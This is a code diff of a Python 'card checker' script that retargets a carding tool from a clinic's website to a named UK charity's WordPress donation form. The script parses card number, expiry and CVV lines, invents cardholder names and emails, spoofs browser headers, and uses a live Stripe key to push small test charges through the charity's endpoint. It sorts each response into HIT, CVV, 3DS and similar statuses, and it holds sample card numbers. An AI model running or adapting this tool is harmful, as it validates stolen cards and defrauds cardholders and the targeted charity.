@@ -1,40 +1,38 @@
+# gatet.py - River Network Charity Stripe Gateway
 import requests
-import time
 import random
 import uuid
+import json
 from faker import Faker
 
 fake = Faker("en_US")
 
 # ========== CLASSIFICATION KEYS ==========
-success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!"]
-ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "Your card number is incorrect", "number is incorrect"]
-declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order"]
-cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "cvc"]
-insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient", "low funds", "balance"]
-expired_keys = ["card has expired"]
-otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction", "3d_secure", "authenticate", "client_secret"]
-
-# Amounts to try in order (from lowest to highest)
-TRY_AMOUNTS = ["0.50", "1.00", "1.50", "2.00", "2.50", "3.00", "3.50", "4.00", "4.50", "5.00"]
+success_keys = ["succeeded", "success", "paid", "charge", "thank", "Thanks", "Thank", "confirmation", "Successful", "redirect"]
+declined_keys = ["declined", "insufficient", "card_error", "do_not_honor", "generic_decline", "cannot be processed"]
+cvv_keys = ["cvc", "cvv", "security code", "incorrect_cvv", "transaction_not_allowed"]
+expired_keys = ["expired", "expired_card", "card has expired"]
+otp_keys = ["3d_secure", "authenticate", "requires_action", "verifying", "action_required"]
+insufficient_keys = ["insufficient_funds", "Insufficient Funds", "low funds", "balance"]
 
 def classify_response(last):
     last_lower = str(last).lower()
     if any(key.lower() in last_lower for key in success_keys): 
         return "HIT"
-    if any(key.lower() in last_lower for key in ccn_keys): 
-        return "CCN"
-    if any(key.lower() in last_lower for key in cvv_keys): 
-        return "CVV"
     if any(key.lower() in last_lower for key in otp_keys): 
         return "3DS"
-    if any(key.lower() in last_lower for key in insufficient_keys): 
-        return "INSUFFICIENT"
+    if any(key.lower() in last_lower for key in cvv_keys): 
+        return "CVV"
     if any(key.lower() in last_lower for key in expired_keys): 
         return "EXPIRED"
+    if any(key.lower() in last_lower for key in insufficient_keys): 
+        return "INSUFFICIENT"
     if any(key.lower() in last_lower for key in declined_keys): 
         return "DECLINED"
     return "DEAD"
+
+def gen_random_guid():
+    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"
 
 def gen_random_user_agent():
     chrome_version = random.randint(120, 137)
@@ -47,26 +45,13 @@ def gen_random_user_agent():
     ]
     return random.choice(user_agents)
 
-def gen_random_name():
-    return fake.first_name(), fake.last_name()
-
-def gen_random_email(first_name, last_name):
-    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com"]
-    return f"{first_name.lower()}{random.randint(1000, 99999)}{random.choice(domains)}"
-
-def gen_random_guid():
-    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"
-
-def make_payment(ccx: str, charge_amount: str):
+def make_payment(ccx: str, amount: str):
     """
-    Make a single payment attempt with specific amount
-    Returns: (status, message, used_amount)
+    River Network Charity - Stripe Payment Gateway
     """
     
     # Parse card details
-    ccx = ccx.strip()
-    parts = ccx.split("|")
-    
+    parts = ccx.strip().split("|")
     if len(parts) != 4:
         return "ERROR", "Invalid format. Use: number|month|year|cvv", None
     
@@ -76,14 +61,15 @@ def make_payment(ccx: str, charge_amount: str):
     if len(yy) == 4 and yy.startswith("20"):
         yy = yy[2:4]
     
-    # Generate random customer data
-    first_name, last_name = gen_random_name()
-    email = gen_random_email(first_name, last_name)
-    full_name = f"{first_name} {last_name}"
+    # Generate random data
+    first_name = fake.first_name()
+    last_name = fake.last_name()
+    full_name = f"{first_name} {last_name}".upper()
+    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
     
-    # Stripe publishable key for farmingdalephysicaltherapywest.com
-    stripe_key = "pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv"
-    wallet_config_id = "2cf18455-8d84-460f-9efe-2176e44a40b2"
+    # Stripe keys for rivernetworkcharity.org.uk
+    stripe_key = "pk_live_51Op8d8GLdQ7N2bVjuMWV6qteyKXoHklyfJXorljrH32nZ9vLEJyvfN77EY4Clpdlkd1AN7xjrd17nJWolSI4bpNA004zu0cPZh"
+    wallet_config_id = "978cbaf9-eff0-4883-9c7c-ba03389b50a7"
     
     session = requests.Session()
     
@@ -97,7 +83,7 @@ def make_payment(ccx: str, charge_amount: str):
     session.cookies.set('__stripe_mid', muid)
     session.cookies.set('__stripe_sid', sid)
     
-    # ========== STEP 1: Create Payment Method with Stripe API ==========
+    # ========== STEP 1: Create Payment Method ==========
     url_stripe = "https://api.stripe.com/v1/payment_methods"
     
     stripe_data = (
@@ -111,8 +97,8 @@ def make_payment(ccx: str, charge_amount: str):
         f'&muid={muid}'
         f'&sid={sid}'
         f'&pasted_fields=number'
-        f'&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element'
-        f'&referrer=https%3A%2F%2Ffarmingdalephysicaltherapywest.com'
+        f'&payment_user_agent=stripe.js%2Fe96dd26916%3B+stripe-js-v3%2Fe96dd26916%3B+card-element'
+        f'&referrer=https%3A%2F%2Frivernetworkcharity.org.uk'
         f'&time_on_page={random.randint(10000, 60000)}'
         f'&client_attribution_metadata[client_session_id]={client_session_id}'
         f'&client_attribution_metadata[merchant_integration_source]=elements'
@@ -129,6 +115,9 @@ def make_payment(ccx: str, charge_amount: str):
         'origin': 'https://js.stripe.com',
         'referer': 'https://js.stripe.com/',
         'user-agent': gen_random_user_agent(),
+        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
     }
     
     try:
@@ -152,15 +141,16 @@ def make_payment(ccx: str, charge_amount: str):
     except Exception as e:
         return "ERROR", f"JSON_PARSE_ERROR: {str(e)}", None
     
-    # ========== STEP 2: Charge via WordPress Admin AJAX ==========
-    url_wp = "https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php"
+    # ========== STEP 2: Charge via WordPress ==========
+    url_wp = "https://rivernetworkcharity.org.uk/wp-admin/admin-ajax.php"
     
     wp_data = {
-        'action': 'wp_full_stripe_inline_payment_charge',
-        'wpfs-form-name': 'Payment-Form',
+        'action': 'wp_full_stripe_inline_donation_charge',
+        'wpfs-form-name': 'RiverNetworkDonation',
         'wpfs-form-get-parameters': '{}',
-        'wpfs-custom-amount-unique': charge_amount,
-        'wpfs-custom-input[]': full_name,
+        'wpfs-custom-amount': 'other',
+        'wpfs-custom-amount-unique': amount,
+        'wpfs-donation-frequency': 'one-time',
         'wpfs-card-holder-email': email,
         'wpfs-card-holder-name': full_name,
         'wpfs-stripe-payment-method-id': payment_method_id,
@@ -170,8 +160,8 @@ def make_payment(ccx: str, charge_amount: str):
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'Accept-Language': 'en-US,en;q=0.9',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://farmingdalephysicaltherapywest.com',
-        'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
+        'Origin': 'https://rivernetworkcharity.org.uk',
+        'Referer': 'https://rivernetworkcharity.org.uk/giving/',
         'X-Requested-With': 'XMLHttpRequest',
         'User-Agent': gen_random_user_agent(),
         'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
@@ -182,7 +172,7 @@ def make_payment(ccx: str, charge_amount: str):
     try:
         r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
     except requests.exceptions.RequestException as e:
-        return "ERROR", f"WP_NETWORK_ERROR: {str(e)}", charge_amount
+        return "ERROR", f"WP_NETWORK_ERROR: {str(e)}", amount
     
     # Parse response
     try:
@@ -192,48 +182,46 @@ def make_payment(ccx: str, charge_amount: str):
         # Check if this amount worked
         status = classify_response(message)
         
-        # If we got a valid response (not amount-related error)
         if status == "HIT":
-            return "HIT", message, charge_amount
-        elif status == "CCN":
-            return "CCN", message, charge_amount
-        elif status == "CVV":
-            return "CVV", message, charge_amount
+            return "HIT", message, amount
         elif status == "3DS":
-            return "3DS", message, charge_amount
-        elif status == "INSUFFICIENT":
-            return "INSUFFICIENT", message, charge_amount
+            return "3DS", message, amount
+        elif status == "CVV":
+            return "CVV", message, amount
         elif status == "EXPIRED":
-            return "EXPIRED", message, charge_amount
+            return "EXPIRED", message, amount
+        elif status == "INSUFFICIENT":
+            return "INSUFFICIENT", message, amount
         elif status == "DECLINED":
-            # Check if declined due to amount
             if "amount" in str(message).lower() or "minimum" in str(message).lower():
-                return "AMOUNT_ERROR", message, charge_amount
-            return "DECLINED", message, charge_amount
+                return "AMOUNT_ERROR", message, amount
+            return "DECLINED", message, amount
         else:
-            return "UNKNOWN", message, charge_amount
+            return "UNKNOWN", message, amount
             
     except Exception as e:
-        return "ERROR", f"PARSE_ERROR: {str(e)}", charge_amount
+        return "ERROR", f"PARSE_ERROR: {str(e)}", amount
 
 
 def Tele(ccx: str):
     """
     Check credit card with automatic amount detection
     Input: "card_number|month|year|cvv"
-    Returns: response string
+    Returns: response string for bot.py compatibility
     """
     
-    # First, try with default amount
-    for amount in TRY_AMOUNTS:
+    # Try different amounts from low to high
+    amounts = ["0.50", "1.00", "1.50", "2.00", "2.50", "3.00", "3.50", "4.00", "4.50", "5.00"]
+    
+    for amount in amounts:
         status, message, used_amount = make_payment(ccx, amount)
         
-        # If it's a card error (CCN, CVV, EXPIRED) - stop trying, return immediately
-        if status in ["CCN", "CVV", "EXPIRED", "3DS"]:
+        # If it's a card error - stop trying, return immediately
+        if status in ["CCN", "CVV", "EXPIRED"]:
             return message
         
-        # If it's a HIT or INSUFFICIENT - success! return
-        if status in ["HIT", "INSUFFICIENT"]:
+        # If it's a HIT or INSUFFICIENT or 3DS - success!
+        if status in ["HIT", "INSUFFICIENT", "3DS"]:
             return message
         
         # If it's DECLINED but not amount-related, return
@@ -249,16 +237,16 @@ def Tele(ccx: str):
             continue
     
     # If we tried all amounts and none worked
-    return f"Amount Error: Tried {', '.join(TRY_AMOUNTS)} but none worked"
+    return f"Amount Error: Tried all amounts but none worked"
 
 
 # ========== TEST ==========
 if __name__ == "__main__":
     print("=" * 50)
-    print("Farmingdale Physical Therapy - Auto Amount Detection")
+    print("River Network Charity - Card Checker")
     print("=" * 50)
     
-    test_card = "5523425507426613|05|29|300"
+    test_card = "5354563100903028|06|27|821"
     
     print(f"\n[+] Testing: {test_card}")
     print("[+] Will try amounts: 0.50 → 1.00 → 1.50 → ... → 5.00")
